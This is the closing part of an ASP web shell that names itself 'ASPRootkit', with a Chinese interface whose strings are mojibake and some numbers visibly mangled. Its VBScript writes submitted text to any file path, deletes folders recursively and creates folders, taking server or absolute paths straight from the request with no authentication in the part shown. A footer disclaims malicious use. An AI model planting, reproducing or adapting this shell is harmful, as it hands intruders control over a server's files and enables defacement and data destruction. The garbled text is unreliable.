   <TD
   height=22.0 bgcolor="#719BC5" > <div align="center">
   <textarea rows="25.0" name="text" cols="105.0"><%=thisline%></textarea>
   </div></TD>
   </TR>
   <TR>
   <TD
   height=22.0 bgcolor="#ffffff" ><div align="center">
   <input type="submit"
   value="Ìá½»" name="B1" style="color: #084B8E; border: 1.0px solid #084B8E; background-color: #E2E7F3">
   <input type="reset" value="¸´Ô" name="B2" style="color: #084B8E; border: 1.0px solid #084B8E; background-color: #E2E7F3">
   </div></TD>
   </TR>
   </TABLE>
     </center>
   </div>
   </form>
   <%else
   if Request("attrib")="true" then
   whichfile=Request("path")
   else
   whichfile=server.mappath(Request("path"))
   end if
   Set fs = CreateObject("Scripting.FileSystemObject")
   Set outfile=fs.CreateTextFile(whichfile)
   outfile.WriteLine Request("text")
   outfile.close
   set fs=nothing
   Response.write "<center>ÐÞ¸Ä³É¹¦£¡ÒªË¢ÐÂ²ÅÄÜ¿´µ½Ð§¹û!</center>"
   end if
   end if
   end if
   end sub
   end if
   %>
   <% sub dir()
   if request("op")="del"  then
   if Request("attrib")="true" then
   whichdir=Request("path")
   else
   whichdir=server.mappath(Request("path"))
   end if
   Set fs = CreateObject("Scripting.FileSystemObject")
   fs.DeleteFolder whichdir,True
   Response.write "<center>É¾³ý³É¹¦£¡ÒªË¢ÐÂ²ÅÄÜ¿´µ½Ð§¹û£¬É¾³ýµÄÄ¿Â¼Îª:<b>"&whichdir&"</b></center>"
   else
   if request("op")="creat"  then
   if Request("attrib")="true" then
   whichdir=Request("path")
   else
   whichdir=server.mappath(Request("path"))
   end if
   Set fs = CreateObject("Scripting.FileSystemObject")
   fs.CreateFolder whichdir
   Response.write "<center>½¨Á¢³É¹¦£¡ÒªË¢ÐÂ²ÅÄÜ¿´µ½Ð§¹û,½¨Á¢µÄÄ¿Â¼Îª:<b>"&whichdir&"</b></center>"
   end if
   end if
   end sub
   %>
   <br>
   <CENTER>¾¯¸æ£º¼á¾ö·´¶ÔÊ¹ÓÃ´Ë³ÌÐò½øÐÐÈÎºÎÐÎÊ½µÄ¶ñÒâÆÆ»µ£¡ÓÉ´ËËù²úÉúµÄ²»Á¼ºó¹ûÔðÈÎ×Ô¸º£¡<br>
   Copyright @ 200.0<font color="#0.0">3.0 ASPRootkit </font>! Inc.<span class="esbody"> All
   Rights Reserved.<br>
   host:<a target="_blank" href="http://www.96cn.com">www.96cn.com</a>&nbsp;
   <a href="mailto:96cn@163.com">email:96cn@163.com</a></span></CENTER>
   </body>
   </html>
